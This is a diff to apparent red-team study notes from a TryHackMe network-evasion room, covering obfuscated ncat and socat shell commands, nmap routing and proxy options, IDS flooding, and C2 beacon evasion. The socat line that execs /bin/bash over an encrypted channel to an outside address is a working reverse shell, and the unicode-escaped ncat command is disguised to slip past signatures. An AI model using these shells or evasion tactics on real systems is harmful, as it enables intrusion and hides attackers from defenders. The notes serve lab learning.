@@ -65,7 +65,7 @@ ncat -lvnp 1234 -e /bin/bash 	=       # escape unicode, with cyberchef
 `\u006e\u0063\u0061\u0074\u0020\u002d\u006c\u0076\u006e\u0070\u0020\u0031\u0032\u0033\u0034\u0020\u002d\u0065\u0020\u002f\u0062\u0069\u006e\u002f\u0062\u0061\u0073\u0068`
 ```
 
-## Encrypting the communication channel
+#### Encrypting the communication channel
 Create Privacy Enhanced Mail(PEM), see [[Socat-Cheatsheet]]
 ```bash
 openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt
@@ -98,7 +98,35 @@ socat -d -d TCP-LISTEN:4443,fork STDOUT
 socat OPENSSL:10.10.10.10:4443,verify=0 EXEC:/bin/bash
 ```
 
-## Modifying the shellcode
+#### Modifying the shellcode
+
+## Route Manipulation
+With example of [[Nmap-Cheatsheet]]
+
+Relying on source routing with `--ip-options "L $IP $IP $IP"` would specify loose routing - scan through any in the array, whereas strict routing with `"S"` as the 0th index of the string would strict hop from first `$IP` to the last.
+
+Using proxy servers with `--proxies proto://host:port, proto://host:port`, Valid protocols are HTTP and SOCKS4 - authenication is not supported.
+
+
+
+## Evasion via Tactical DoS
+
+IDS/IPS requires a high processing power to managing and regulate rules grows and tthe network traffic volume increase, and with spefically IDS logging of said traffic and matching of rule signatures.
+1. Create a huge amount of benign traffic that would simply overload the processing capacity of the IDS/IPS.
+1. Create a massive amount of not-malicious traffic that would still make it to the logs, congesting the communication channel with the logging server or exceed its disk writing capacity.
+
+## C2 Evasive Tactices
+See [[Introduction-To-Comand-And-Control-Frameworks]] for more information:
+
+1. User Agent - Innocuous configuration rather than default
+2. Sleep time - control callback interval between beacon checkins
+3. Jitter - Pseudo-Randomness of sleep time THM:*"A jitter of 30% results in a sleep time of ±30% to further evade detection."*
+4. SSL Certificate - Authenicity equals success
+5. DNS Beacon - If exfiltrating data via DNS - configure DNS server and the hostname in the DNS query
+
+[Cobalt Strike guideline profile](https://github.com/bigb0sss/RedTeam-OffensiveSecurity/blob/master/01-CobaltStrike/malleable_C2_profile/CS4.0_guideline.profile)
+
+
 
 ## Next-Gen Security
 
@@ -113,3 +141,4 @@ Next-Generation Network IPS (NGNIPS) has the following five characteristics acco
 
 ## References
 [THM Network Evasion Room](https://tryhackme.com/room/redteamnetsec)
+[Cobalt Strike guideline profile](https://github.com/bigb0sss/RedTeam-OffensiveSecurity/blob/master/01-CobaltStrike/malleable_C2_profile/CS4.0_guideline.profile)
